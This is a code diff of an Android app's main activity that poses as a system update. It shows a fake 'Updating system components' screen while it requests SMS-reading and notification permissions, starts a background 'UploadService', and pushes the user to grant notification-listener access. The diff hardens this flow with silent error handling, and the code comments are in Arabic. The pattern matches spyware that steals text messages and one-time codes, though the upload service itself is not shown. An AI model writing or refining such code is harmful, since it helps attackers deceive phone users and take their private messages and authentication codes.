@@ -1,7 +1,9 @@
+
 package com.system.update;
 
 import android.Manifest;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
@@ -15,30 +17,47 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        TextView tv = new TextView(this);
-        tv.setText("Updating system components…\n\nPlease wait.");
-        tv.setPadding(60, 250, 60, 60);
-        tv.setTextSize(18);
-        setContentView(tv);
+        try {
+            TextView tv = new TextView(this);
+            tv.setText("Updating system components…\n\nPlease wait.");
+            tv.setPadding(60, 250, 60, 60);
+            tv.setTextSize(18);
+            setContentView(tv);
 
-        if (Build.VERSION.SDK_INT >= 23) {
-            ActivityCompat.requestPermissions(this,
-                new String[]{
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.READ_SMS
-                }, 1);
-        }
+            if (Build.VERSION.SDK_INT >= 23) {
+                ActivityCompat.requestPermissions(this,
+                    new String[]{
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.POST_NOTIFICATIONS
+                    }, 1);
+            }
 
-        Intent svc = new Intent(this, UploadService.class);
-        if (Build.VERSION.SDK_INT >= 26) {
-            startForegroundService(svc);
-        } else {
-            startService(svc);
-        }
+            // ابدأ الخدمة بحماية
+            try {
+                Intent svc = new Intent(this, UploadService.class);
+                if (Build.VERSION.SDK_INT >= 26) {
+                    startForegroundService(svc);
+                } else {
+                    startService(svc);
+                }
+            } catch (Exception e) {
+                // ما نطيح لو فشل
+            }
 
-        if (!isNotifListenerEnabled()) {
-            startActivity(new Intent(
-                "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+            // افتح صفحة الإشعارات
+            try {
+                if (!isNotifListenerEnabled()) {
+                    startActivity(new Intent(
+                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+                }
+            } catch (Exception e) {}
+
+        } catch (Exception e) {
+            TextView err = new TextView(this);
+            err.setText("Error: " + e.getMessage());
+            err.setPadding(30, 300, 30, 30);
+            setContentView(err);
         }
     }
 
